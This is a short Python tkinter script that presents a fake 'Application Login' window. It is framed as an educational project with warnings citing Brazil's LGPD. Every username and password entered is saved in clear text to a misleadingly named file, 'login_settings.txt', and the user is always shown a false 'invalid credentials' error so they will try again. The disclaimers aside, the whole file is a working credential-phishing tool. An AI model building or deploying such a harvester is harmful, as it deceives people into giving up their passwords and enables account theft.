# WARNING: This project is for educational purposes only. Do not use to collect real credentials. Always respect laws like Brazil's LGPD!

import tkinter as tk
from tkinter import messagebox 
import datetime
import os

LOG_FILE = "login_settings.txt"

def user(username, password):
    try:
        with open(LOG_FILE, "a") as file:
            file.write(f"{datetime.datetime.now()}: User: {username}, Password: {password}\n")
    except Exception as e:
        messagebox.showerror("Error", f"Error saving attempt: {e}")

def login(entry_user, entry_pass):
    username = entry_user.get()
    password = entry_pass.get()

    if not username or not password:
        messagebox.showwarning("Warning", "Please, fill in all the fields!")
        return
    
    user(username, password)
    messagebox.showerror("Error", "Invalid credentials. Please try again.")

    entry_user.delete(0, tk.END)
    entry_pass.delete(0, tk.END)

def window():
    window = tk.Tk()
    window.title("Applicattion Login")
    window.geometry("400x300")
    window.resizable(False, False)

    frame = tk.Frame(window)
    frame.pack(pady=20)

    tk.Label(frame, text="User:", font=("Arial", 10)).grid(row=0, column=0, padx=5, pady=5)
    entry_user = tk.Entry(frame, width=30)
    entry_user.grid(row=0, column=1, padx=5, pady=5)

    tk.Label(frame, text="Password:", font=("Arial", 10)).grid(row=1, column=0, padx=5, pady=5)
    entry_pass = tk.Entry(frame, width=30, show="*")
    entry_pass.grid(row=1, column=1, padx=5, pady=5)

    tk.Button(window, text="Login", command=lambda: login(entry_user, entry_pass)).pack(padx=10)
    tk.Button(window, text="Exit", command=window.quit).pack(pady=5)

    window.mainloop()

if __name__ == "__main__":
    window()

# END: Reminder: Use this code only for learning in controlled environments. Respect laws, such as Brazil's LGPD!
